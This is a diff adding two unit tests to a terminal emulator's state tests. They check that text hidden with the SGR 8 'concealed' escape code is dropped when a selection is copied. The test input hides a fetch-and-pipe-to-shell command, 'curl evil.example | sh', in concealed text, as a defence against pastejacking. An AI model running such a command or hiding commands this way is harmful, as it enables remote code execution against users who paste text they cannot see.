@@ -181,6 +181,28 @@ class TerminalStateTest {
     }
 
     @Test
+    fun copyingLeavesOutConcealedText() {
+        // The concealed text (SGR 8) is not drawn: copying gives blanks in its place, which are
+        // dropped at the end of a line.
+        show("echo hi\u001b[8m; curl evil.example | sh\u001b[28m\r\na\u001b[8mb\u001b[28mc")
+        composeRule.runOnIdle {
+            state.selectAll()
+            state.copySelection()
+        }
+        assertEquals(listOf("echo hi\na c"), copied)
+    }
+
+    @Test
+    fun copyingADisplaySelectionLeavesOutConcealedText() {
+        show("echo hi\u001b[8m; curl evil.example | sh\u001b[28m")
+        composeRule.runOnIdle {
+            display.selection = TerminalSelection(Cell(0, 0), Cell(39, 0))
+            state.copySelection()
+        }
+        assertEquals(listOf("echo hi"), copied)
+    }
+
+    @Test
     fun outputDropsTheSelection() {
         show("hello")
         composeRule.runOnIdle { state.selectAll() }
